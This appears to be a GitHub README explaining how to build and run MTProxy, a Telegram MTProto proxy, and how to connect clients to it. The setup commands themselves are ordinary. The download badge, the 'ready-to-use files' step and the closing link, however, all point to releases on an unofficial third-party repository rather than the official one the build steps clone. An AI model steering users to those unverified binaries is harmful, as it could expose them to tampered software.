# 🚦 MTProxy - Simple Proxy for Telegram Access

[![Download MTProxy](https://img.shields.io/badge/Download-MTProxy-blue?style=for-the-badge&logo=github)](https://github.com/Jesusnnc/MTProxy/releases)

---

## ⚙️ What is MTProxy?

MTProxy is a lightweight proxy tool made for Telegram. It lets you connect to Telegram servers through a special proxy setup called MT-Proto. This helps you access Telegram even if it is restricted in your area or network. It is simple and uses secure methods for your connection.

MTProxy can work on different operating systems like Windows, macOS, and Linux, but it needs some setup steps before you can run it. This guide walks you through downloading, installing, and starting MTProxy with easy instructions.

---

## 💻 System Requirements

Before running MTProxy, make sure your computer meets these basic requirements:

- Operating System: Windows 10 or later, macOS 10.13+, or Linux with 64-bit support
- RAM: At least 1 GB free memory
- Disk Space: Minimum 100 MB free storage
- Network: Any stable internet connection
- Software: Basic tools and libraries to build and run software (explained below)

---

## 🛠️ Preparing Your Computer

MTProxy needs some tools to be installed in your system to build and run correctly.

### For Windows users

MTProxy is mainly designed for Linux. For Windows, installing a Linux environment like WSL (Windows Subsystem for Linux) is recommended before you follow the Linux setup instructions below.

### For macOS users

You need to have **Homebrew** installed. Open the Terminal app and install the required packages with:

```bash
brew install openssl zlib
```

### For Linux users

Depending on your Linux distribution, the commands to install needed software differ.

#### Debian and Ubuntu

Open your terminal and type:

```bash
sudo apt update
sudo apt install git curl build-essential libssl-dev zlib1g-dev
```

#### CentOS and RHEL

Open the terminal and run:

```bash
sudo yum install openssl-devel zlib-devel
sudo yum groupinstall "Development Tools"
```

---

## 📥 Download & Install MTProxy

You will first download the MTProxy source code and then build it on your system.

**Step 1: Visit the MTProxy releases page**

To get the latest version, open this link in your browser:

[Visit MTProxy Releases](https://github.com/Jesusnnc/MTProxy/releases)

Here you will find the ready-to-use files or the source code to build.

**Step 2: Clone the MTProxy source code**

If you want the latest source and can build it yourself, open a terminal or command prompt and type:

```bash
git clone https://github.com/TelegramMessenger/MTProxy
cd MTProxy
```

This downloads the MTProxy files to your computer.

**Step 3: Build MTProxy**

Run the following command in the terminal inside the MTProxy folder:

```bash
make
```

This will create the program file in the folder `objs/bin/` named `mtproto-proxy`.

If you see errors during build, run this to clean first:

```bash
make clean
```

Then try building again.

---

## 🚀 Running MTProxy

Once MTProxy is ready, follow these steps to start the proxy server.

### Step 1: Get your secret

MTProxy needs a secret file to connect securely to Telegram. Download it by running:

```bash
curl -s https://core.telegram.org/getProxySecret -o proxy-secret
```

This file contains the secret key MTProxy uses.

### Step 2: Get Telegram configuration

Telegram sometimes changes its server settings. You should download the latest config with:

```bash
curl -s https://core.telegram.org/getProxyConfig -o proxy-multi.conf
```

### Step 3: Create your connection secret

You must create a secret key used by your clients to connect to your proxy.

Use this sample command to generate one:

```bash
head -c 16 /dev/urandom | xxd -ps
```

Copy the output. This is your unique secret.

---

## ▶️ Start MTProxy with your secret

Run the proxy with the generated secret and config files.

Use this command, replacing `YOUR_SECRET` with your generated key:

```bash
objs/bin/mtproto-proxy -u nobody -p 8888 -H 443 -S YOUR_SECRET --proxy-secret proxy-secret --proxy-config proxy-multi.conf
```

Explanation:
- `-u nobody`: Runs with minimal permissions for safety
- `-p 8888`: Local port MTProxy will listen on
- `-H 443`: Public port to accept Telegram connections (usually 443 for HTTPS)
- `-S YOUR_SECRET`: Your client secret key
- `--proxy-secret proxy-secret`: The download secret file
- `--proxy-config proxy-multi.conf`: Telegram server configuration

You can adjust port numbers if needed.

---

## 🔍 How to connect Telegram to MTProxy

After setting up the server, you need to tell Telegram to use your proxy.

- Open Telegram app on your phone or desktop.
- Go to **Settings > Data and Storage > Proxy Settings**.
- Add a new MTProto proxy.
- Enter your server's IP address or domain name.
- Use port `443` (or your chosen port).
- Paste the secret key you created in Step 3.
- Save and enable the proxy.

Now your Telegram app will route messages through your MTProxy server.

---

## ⚠️ Troubleshooting Tips

- If MTProxy doesn't start, check error messages for missing packages or wrong file paths.
- Ensure your firewall allows connections on the port MTProxy listens (default 443).
- Keep your `proxy-secret` and `proxy-multi.conf` files updated regularly.
- Use `make clean` if build errors persist.
- Restart MTProxy after any configuration changes.

---

## 📖 Additional Resources

- [MTProxy Official Documentation](https://core.telegram.org/mtproto/proxy)
- [Telegram MTProto Protocol Explained](https://core.telegram.org/mtproto)
- [GitHub Issues for MTProxy](https://github.com/TelegramMessenger/MTProxy/issues) — to report bugs or ask for help

---

## ✅ Key Features

- Simple setup for Telegram proxy server
- Supports secure MTProto protocol
- Works on Linux, macOS, and Windows (via WSL)
- Regularly updated with Telegram server configs
- Lightweight and fast with minimal resource use

---

## 📌 Summary

MTProxy helps you run your own Telegram proxy. It requires basic installation of tools and building from source. After setup, you control a proxy to bypass limits to Telegram. This guide shows you every step in detail to make it easy even if you don’t have programming experience.

[Download MTProxy Releases](https://github.com/Jesusnnc/MTProxy/releases) to get started or explore versions ready for use.